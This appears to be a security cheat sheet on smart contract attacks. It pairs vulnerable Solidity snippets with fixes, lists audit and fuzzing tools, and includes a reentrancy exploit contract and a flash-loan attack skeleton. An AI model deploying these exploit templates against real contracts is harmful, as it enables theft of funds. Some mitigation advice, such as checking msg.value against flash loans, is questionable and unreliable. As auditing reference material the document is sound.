# Smart Contract Attack Reference

## Analysis Tools

### Slither
```bash
# Static analysis
slither contracts/

# Specific detector
slither contracts/ --detect reentrancy
```

### Mythril
```bash
# Security analysis
myth analyze contracts/Vulnerable.sol

# With timeout
myth analyze contracts/Vulnerable.sol --execution-timeout 30
```

### Echidna
```bash
# Fuzzing
echidna-test contracts/Test.sol --contract TestContract
```

## Common Vulnerabilities

### Reentrancy
```solidity
// Vulnerable
function withdraw(uint amount) public {
    require(balances[msg.sender] >= amount);
    (bool success, ) = msg.sender.call{value: amount}("");
    require(success);
    balances[msg.sender] -= amount;
}

// Fixed
function withdraw(uint amount) public {
    require(balances[msg.sender] >= amount);
    balances[msg.sender] -= amount;  // State update BEFORE external call
    (bool success, ) = msg.sender.call{value: amount}("");
    require(success);
}
```

### Integer Overflow
```solidity
// Solidity <0.8.0 vulnerable
uint balance = balances[msg.sender];
balance -= amount;  // Underflow possible

// Fixed with SafeMath
balances[msg.sender] = balances[msg.sender].sub(amount);

// Or use Solidity >=0.8.0 (built-in overflow checks)
```

### Access Control
```solidity
// Vulnerable - missing modifier
function transferOwnership(address newOwner) public {
    owner = newOwner;
}

// Fixed
function transferOwnership(address newOwner) public onlyOwner {
    owner = newOwner;
}
```

### Front Running
```solidity
// MEV (Miner Extractable Value) attack
// Miners can reorder transactions

// Mitigation: Commit-reveal scheme
bytes32 hash = keccak256(abi.encodePacked(value, secret));
// ... later reveal
require(keccak256(abi.encodePacked(value, secret)) == hash);
```

### Flash Loan Attack
```solidity
// Manipulate price oracle with flash loan

// Mitigation: Use TWAP oracles
// Or check msg.value == 0
```

## Attack Scripts

### Exploit Template
```solidity
contract Exploit {
    address target;
    
    constructor(address _target) {
        target = _target;
    }
    
    function attack() external {
        // Call vulnerable function
        Vulnerable(target).withdraw(1 ether);
    }
    
    receive() external payable {
        // Reentrancy callback
        if (address(this).balance > 0) {
            Vulnerable(target).withdraw(1 ether);
        }
    }
}
```

### Flash Loan Template
```solidity
// Using Aave flash loan
function flashLoan(uint amount) external {
    IERC20 token = IERC20(address(0x...));
    
    IAToken(aave).flashLoan(
        address(this),
        address(token),
        amount,
        "",
        0,
        0,
        0
    );
}

function executeOperation(
    address asset,
    uint amount,
    uint premium,
    address initiator,
    bytes calldata params
) external returns (bool) {
    // Attack logic here
    
    // Repay flash loan
    IERC20(asset).approve(msg.sender, amount + premium);
    return true;
}
```

## DeFi Attacks

### Price Oracle Manipulation
```solidity
// Attack: Manipulate DEX price

// Mitigation: Use TWAP oracle
// Or check multiple sources
```

### Governance Attack
```solidity
// Flash loan to get voting power

// Mitigation: Time-lock governance
// Or require tokens held for > X blocks
```

### Rug Pull Detection
```solidity
// Check for:
// - Hidden mint function
// - Proxy upgrade pattern
// - Unlocked liquidity
// - Owner-only functions

// Tools
slither --detect locked-ether
slither --detect external-function
```

## Testing

### Foundry
```bash
# Run tests
forge test

# Fuzzing
forge test --fuzz

# Gas reports
forge test --gas-report
```

### Hardhat
```bash
# Run tests
npx hardhat test

# Coverage
npx hardhat coverage
```

## Deployment Security

```bash
# Verify source code
ethverify verify --address 0x... --contract src/Vulnerable.sol

# Check bytecode match
# Compare deployed bytecode with compiled
```
